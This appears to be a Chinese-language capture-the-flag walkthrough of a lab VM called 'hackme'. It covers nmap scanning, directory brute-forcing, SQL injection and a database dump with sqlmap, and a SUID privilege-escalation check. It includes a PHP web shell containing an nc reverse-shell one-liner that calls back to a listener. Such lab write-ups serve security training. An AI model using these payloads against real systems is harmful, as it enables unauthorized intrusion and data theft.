 # hackme  
 ## 信息收集&&发现  
 查询ip地址  
 ```
 nmap -PR 192.168.1.* 
 ``` 
 ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200205165057.png)  
 查询开放的端口  
 ```
 nmap -p 1-65535 ip 
 ```  
 ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200205165219.png)  
 
 登录上去之后发现是一个php网站，一来就需要我们输入密码，这个时候考虑弱密码和sql注入的问题，但是为了收集信息我们还是先对目录进行爆破  
 ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200205165438.png)  
 ```
python3 dirsearch.py -e php -u 192.168.1.61
 ```  
 ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200205165819.png)
 访问其中的uploads文件夹发现
 ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200205170109.png)  
 考虑是否存在文件读取的漏洞？  
 再访问注册页面发现可以进行注册，注册一个用户之后发现存在一个搜索框，是否存在sql注入漏洞呢？   
 ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200205170402.png)  
 果然存在sql注入  
 ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200205171008.png)
 ```
sqlmap -r X -p search --current-db --batch  当前的数据库
sqlmap -r X -p search --dbs --batch 所有的数据库 
sqlmap -r X -p  search -D webapphacking --dump-all --batch 将数据库当中的所有数据dump出来  
 ```  
 dump之后的结果
 ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200205171632.png)  
 注意到其中有一个superadmin 但是没有提示密码  
 所以我们这里存在三种途径  
 1. 继续使用sql 写进shell  
 2.查询superadmin的密码 
 3.使用现在有的密码登录webapp或者ssh
 
 先尝试了3 发现现有的用户并不能登录ssh，或者登录webapp之后并没其他好的权限   
```
 python3 dirsearch.py -u 192.168.1.61 -c PHPSESSID=xxx  -e php 带上cookie进行扫描
``` 
得到的结果发现存在  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200205173454.png)
猜想403是权限不够进行查看，是否是superadmin才能进行查看？  

 尝试2  
 破解密码发现实在是没有破解出来  
 哦，原来当时看到的结果是 
 ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200205181212.png)
 ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200205181611.png)
 真坑啊！！！我当时以为是不能破解！！！！
 得到密码之后，登录并上传shell文件，文件当中的内容为  
 ```
 <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.39 1337 >/tmp/f');?>
 ```   
  然后nc进行监听  
 返回一个普通的权限  
 ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200205182708.png)
 ### 提权
获取交互式的shell  
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```  
 使用python获取交互式的shell  
 
 ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200205222621.png)  
 ```
  find / -perm -u=s -type f 2>/dev/null 查询特殊的权限  
 ``` 
 直接拿到root权限
 ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200205224426.png)
 尝试1 
 看看是否是属于dba权限  
 ```
 sqlmap -r X -p search --is-dba
sqlmap -r X -p search --current-user
 ```  
 ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200205174653.png)  
 发现数据库用户的权限很高，可以考虑使用os-shell  
 
 ## 总结  
 目录扫描  
 sqlmap的基础使用  
 查找特权指令  
 